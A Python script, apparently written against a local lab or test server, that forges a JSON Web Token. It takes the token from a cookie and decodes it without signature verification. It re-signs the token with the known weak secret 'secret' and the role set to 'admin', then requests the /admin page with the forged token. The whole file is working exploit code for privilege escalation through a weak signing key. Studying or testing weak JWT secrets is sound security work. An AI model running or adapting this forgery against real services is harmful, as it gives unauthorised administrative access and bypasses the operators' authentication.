import jwt
import requests

# Target URLs
BASE_URL = 'http://127.0.0.1:5001'
HOME_URL = f'{BASE_URL}/'
ADMIN_URL = f'{BASE_URL}/admin'

# Weak secret key (known)
SECRET_KEY = 'secret'

# Step 1: Visit / and extract token from cookie
session = requests.Session()
response = session.get(HOME_URL)

# Extract 'token' cookie
token = response.cookies.get('token')

if not token:
    print("[!] No token found in cookies!")
    exit(1)

print(f"[+] Got token from cookie: {token}")

# Step 2: Decode the original token (no signature verification)
decoded = jwt.decode(token, options={"verify_signature": False})
print(f"[+] Decoded token: {decoded}")

# Step 3: Forge a token with 'role': 'admin'
forged_payload = {
    'user': decoded.get('user', 'guest'),
    'role': 'admin',
    'exp': decoded['exp']
}

forged_token = jwt.encode(forged_payload, SECRET_KEY, algorithm='HS256')

# If using PyJWT >= 2.x, it returns bytes. Convert to str if needed.
if isinstance(forged_token, bytes):
    forged_token = forged_token.decode()

print(f"[+] Forged admin token: {forged_token}")

# Step 4: Access /admin with the forged token in the Authorization header
headers = {
    'Authorization': forged_token  # (no 'Bearer' prefix, your server uses raw token)
}

admin_response = requests.get(ADMIN_URL, headers=headers)

# Output result
print(f"[+] Admin response status: {admin_response.status_code}")
print(f"[+] Admin response content:\n{admin_response.text}")
